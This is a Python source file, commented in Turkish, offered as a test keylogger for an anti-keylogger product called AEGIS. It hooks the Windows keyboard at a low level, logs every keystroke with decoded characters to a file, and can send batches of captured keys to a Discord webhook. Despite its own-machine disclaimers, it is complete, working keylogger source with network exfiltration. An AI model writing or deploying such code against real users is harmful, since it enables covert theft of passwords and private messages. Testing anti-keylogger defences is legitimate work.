# -*- coding: utf-8 -*-
"""
AEGIS Anti Logger - SADECE TEST AMAÇLI keylogger simülatörü
===========================================================
SADECE kendi bilgisayarında KENDİ anti-keylogger ürününü (AEGIS) test etmek
içindir. Discord webhook'u opsiyoneldir ve yalnızca komut satırında SENİN
verdiğin URL'ye veri gönderir; koda gömülü hiçbir adres yoktur.

KULLANIM
--------
  python test_keylogger.py                            # sadece yerel dosyaya log
  python test_keylogger.py --webhook-url https://discord.com/api/webhooks/...
  python test_keylogger.py --filter-injected          # "akıllı" logger simülasyonu
  python test_keylogger.py --log dosya.txt --dc-inj   # injected satirlari da DC'ye

Bitirmek için: konsolda Ctrl+C (çıkan özet webhook'a da gider)

TEST SENARYOLARI
----------------
  Test A) AEGIS KAPALI + logger açık
      -> yazdıkların [gercek] satırları olarak hem dosyaya hem DC'ye düşer.

  Test B) AEGIS AÇIK (agresif) + logger açık
      -> dosyada [NOISE] çöpler + [inj] kopyalar; [gercek] azalır.
         DC'ye giden [gercek] satırları seyrekleşir (gizleme çalışıyor).

  Test C) AEGIS AÇIK (agresif) + --filter-injected
      -> akıllı logger injected eventleri yutar; DC'ye PRAKTİK MEN hiç
         karakter içeriği gitmez (AEGIS başarılı).
"""
import argparse
import ctypes
import ctypes.wintypes as wt
import datetime
import json
import queue
import sys
import threading
import time
import urllib.request
import urllib.error

LOG_DEFAULT  = "aegis_test_log.txt"
FLUSH_SEC    = 10.0     # webhook'a toplu gönderim periyodu (saniye)
DC_MAX_CHARS = 1800     # Discord mesaj limiti güvenli payı
LOCK = threading.Lock()
COUNTS = {"real": 0, "inj": 0, "noise": 0}

# ---- Win32 sabitleri ----
WH_KEYBOARD_LL           = 13
WM_QUIT                  = 0x0012
LLKHF_UP                 = 0x80
LLKHF_INJECTED           = 0x10
LLKHF_LOWER_IL_INJECTED  = 0x02
SIG_AEGIS_BASE           = 0xA61C0F10   # AEGIS imza tabanı (dwExtraInfo)
NOISE_VKS                = (0xFF, 0x07) # AEGIS'in no-op gürültü VK'ları


class KBDLLHOOKSTRUCT(ctypes.Structure):
    _fields_ = [("vkCode", wt.DWORD),
                ("scanCode", wt.DWORD),
                ("flags", wt.DWORD),
                ("time", wt.DWORD),
                ("dwExtraInfo", ctypes.c_size_t)]


HOOKPROC = ctypes.WINFUNCTYPE(ctypes.c_long, ctypes.c_int, wt.WPARAM,
                              ctypes.POINTER(KBDLLHOOKSTRUCT))

user32 = ctypes.WinDLL("user32", use_last_error=True)

# ---- VK -> karakter (kaba, sadece test) ----
SPECIAL = {
    0x08: "<backspace>", 0x09: "<tab>", 0x0D: "<enter>",
    0x10: "<shift>", 0x11: "<ctrl>", 0x12: "<alt>", 0x14: "<capslock>",
    0x1B: "<esc>", 0x20: " ", 0x2E: "<del>",
    0x25: "<sol>", 0x26: "<yukari>", 0x27: "<sag>", 0x28: "<asagi>",
    0x30: "0", 0x31: "1", 0x32: "2", 0x33: "3", 0x34: "4",
    0x35: "5", 0x36: "6", 0x37: "7", 0x38: "8", 0x39: "9",
}


def vk_to_char(vk: int, shift: bool):
    if vk in SPECIAL:
        return SPECIAL[vk]
    if 0x41 <= vk <= 0x5A:
        ch = chr(vk - 0x41 + ord('a'))
        return ch.upper() if shift else ch
    return None


def is_shift_down() -> bool:
    for vk in (0x10, 0xA0, 0xA1):
        if user32.GetAsyncKeyState(vk) & 0x8000:
            return True
    return False


def stamp() -> str:
    return datetime.datetime.now().strftime("%H:%M:%S.%f")[:-3]


# ---------------- Discord webhook (opsiyonel) ----------------
class DiscordSender(threading.Thread):
    """Toplu satırları periyodik olarak KULLANICININ verdiği webhook'a yollar."""

    def __init__(self, url: str, include_inj: bool):
        super().__init__(daemon=True)
        self.url = url
        self.include_inj = include_inj
        self.lines = []
        self.qitems = 0
        self.stopping = threading.Event()
        self.lock = threading.Lock()

    def push(self, line: str, inj: bool) -> None:
        if inj and not self.include_inj:
            return  # injected satirlar varsayilan DC'ye gitmez
        with self.lock:
            kalan = DC_MAX_CHARS - len("".join(self.lines))
            if kalan > 32:
                pas = line + "\n"
                if len(pas) <= kalan:
                    self.lines.append(pas)
            self.qitems += 1

    def _post(self, content: str) -> bool:
        data = json.dumps({"content": content}).encode("utf-8")
        # Cloudflare, "Python-urllib" User-Agent'ı varsayılan olarak 403 ile
        # reddedebiliyor; bu yüzden tarayıcı tarzı bir UA gönderiyoruz.
        req = urllib.request.Request(
            self.url, data=data,
            headers={
                "Content-Type": "application/json",
                "User-Agent": "AEGIS-Test/1.0 (+own-machine)",
                "Accept": "application/json",
            })
        try:
            with urllib.request.urlopen(req, timeout=15) as resp:
                return resp.status in (200, 204)
        except urllib.error.HTTPError as e:
            body = ""
            try:
                body = e.read().decode("utf-8", "ignore")[:400]
            except Exception:
                pass
            if e.status == 429:
                try:
                    js = json.loads(body)
                    retry = float(js.get("retry_after", 1.0))
                    print(f"[dc] rate-limit, {retry:.1f} sn bekleniyor")
                    time.sleep(min(retry, 6.0))
                except Exception:
                    time.sleep(1.0)
            else:
                print(f"[dc] POST hata: HTTP {e.status}  ->  {body}")
        except Exception as e:
            print(f"[dc] gönderim hatası: {e!r}")
        return False

    def flush(self, footer: str = "") -> None:
        with self.lock:
            chunk, self.lines = self.lines, []
            old = self.qitems
            self.qitems = 0
        if not chunk and footer:
            chunk = footer
        elif footer:
            chunk = "".join(chunk) + footer
        if not chunk:
            return
        self._post(f"```\n{chunk[:DC_MAX_CHARS]}\n```")

    def run(self) -> None:
        while not self.stopping.wait(FLUSH_SEC):
            self.flush()

    def shutdown(self, footer: str) -> None:
        self.stopping.set()
        self.flush(footer)
        time.sleep(0.5)


# ---------------- logger çekirdeği ----------------
G_ = {}

def write_log(fh, text: str) -> None:
    line = f"{stamp()} {text}"
    with LOCK:
        fh.write(line + "\n")
        fh.flush()
    dc: DiscordSender | None = G_.get("dc")
    if dc:
        inj = text.startswith("[inj") or text.startswith("[NOISE]")
        dc.push(line, inj=inj)


def run(logpath: str, filter_injected: bool, dc: DiscordSender | None,
        duration: float | None = None) -> int:
    fh = open(logpath, "a", encoding="utf-8")
    G_["dc"] = dc
    mode = "AKILLI (injected-filtreli)" if filter_injected else "BASIT (her şeyi kaydeder)"
    write_log(fh, f"==== TEST LOGGER BASLADI [{mode}] ====")
    print(f"[TEST LOGGER çalışıyor]  mod: {mode}   log: {logpath}")
    print(f"  discord webhook: {'AKTİF' if dc else 'KAPALI'}")
    print("  - AEGIS kapalıyken yazdıkların [gercek] olur.")
    print("  - AEGIS açıkken: [NOISE] + [inj] çoğalır; [gercek] azalır.")
    print("  - Çıkmak için: Ctrl+C")
    print("-" * 62)

    def hook_proc(code, wp, lp):
        if code == 0:
            kb = lp.contents
            vk, scan, flags, extra = kb.vkCode, kb.scanCode, kb.flags, kb.dwExtraInfo
            injected = bool(flags & LLKHF_INJECTED) or bool(flags & LLKHF_LOWER_IL_INJECTED)
            is_up = bool(flags & LLKHF_UP)
            is_ours = (extra & ~0x3) == SIG_AEGIS_BASE and (extra & 0x3) != 0

            if not injected:
                COUNTS["real"] += 1
                ch = vk_to_char(vk, is_shift_down())
                kind = "[gercek]"
                detail = f"VK=0x{vk:02X} scan=0x{scan:02X}" + (f" char={ch!r}" if ch else "<bilinmeyen>")
            else:
                COUNTS["inj"] += 1
                kind = "[inj]"
                if vk in NOISE_VKS:
                    COUNTS["noise"] += 1
                    kind = "[NOISE]"
                detail = f"VK=0x{vk:02X}" + (" (UP)" if is_up else "")
                if is_ours:
                    detail += " (AEGIS-imzalı)"

            if not (filter_injected and injected):
                write_log(fh, f"{kind:<10s} {detail}")
        return user32.CallNextHookEx(None, code, wp, lp)

    proc = HOOKPROC(hook_proc)
    hook = user32.SetWindowsHookExW(WH_KEYBOARD_LL, proc, None, 0)
    if not hook:
        print("HATA: hook kurulamadı, hata kodu:", user32.GetLastError())
        fh.close()
        return 1

    stop = threading.Event()

    def pump():
        msg = wt.MSG()
        while not stop.is_set():
            r = user32.GetMessageW(ctypes.byref(msg), None, 0, 0)
            if r <= 0 or msg.message == WM_QUIT:
                break
            user32.TranslateMessage(ctypes.byref(msg))
            user32.DispatchMessageW(ctypes.byref(msg))

    t = threading.Thread(target=pump, daemon=True)
    t.start()
    if dc:
        dc.start()

    deadline = (time.monotonic() + duration) if duration else None
    try:
        while t.is_alive():
            t.join(0.4)
            if deadline and time.monotonic() >= deadline:
                print("\nSure doldu, cikiliyor...")
                break
    except KeyboardInterrupt:
        print("\nKapanıyor...")
    finally:
        stop.set()
        user32.PostThreadMessageW(t.ident, WM_QUIT, 0, 0)
        user32.UnhookWindowsHookEx(hook)
        footer = (f"-- ÖZET: gercek={COUNTS['real']} inj={COUNTS['inj']} "
                  f"noise={COUNTS['noise']} --")
        with LOCK:
            fh.write(footer + "\n")
        footer = ("\n" + stamp() + " " + footer)
        if dc:
            dc.shutdown(footer)
        print(f"ÖZET: gercek={COUNTS['real']}  inj={COUNTS['inj']}  noise={COUNTS['noise']}")
        fh.close()
    return 0


if __name__ == "__main__":
    ap = argparse.ArgumentParser(
        description="AEGIS test keylogger - YALNIZCA kendi makinenizde kendi testiniz içindir")
    ap.add_argument("--filter-injected", action="store_true",
                    help="LLKHF_INJECTED eventleri loglama (akıllı logger simülasyonu)")
    ap.add_argument("--log", default=LOG_DEFAULT, help="yerel log dosyası yolu")
    ap.add_argument("--webhook-url", default=None,
                    help="KENDİ discord webhook adresin (komutla geçmiş olmalı)")
    ap.add_argument("--dc-inj", action="store_true",
                    help="[inj] satırlarını da Discord'a yolla (noise hariç)")
    ap.add_argument("--duration", type=float, default=None,
                    help="N saniye sonra kendiliginden kapansin (test icin)")
    args = ap.parse_args()

    dc = None
    if args.webhook_url:
        url = args.webhook_url.strip().strip('"')  # kopyalama artıkları
        ok_prefix = ("https://discord.com/api/webhooks/" in url
                     or "https://discordapp.com/api/webhooks/" in url)
        if not ok_prefix:
            print("HATA: URL 'https://discord.com/api/webhooks/ID/TOKEN' biçiminde olmalı")
            print(f"      aldım: {url[:70]}...")
            sys.exit(1)
        dc = DiscordSender(url, include_inj=args.dc_inj)
        print("UYARI: yakaladığın tuşlar SADECE verdiğin webhook'a gidecek.")

    sys.exit(run(args.log, args.filter_injected, dc, args.duration))
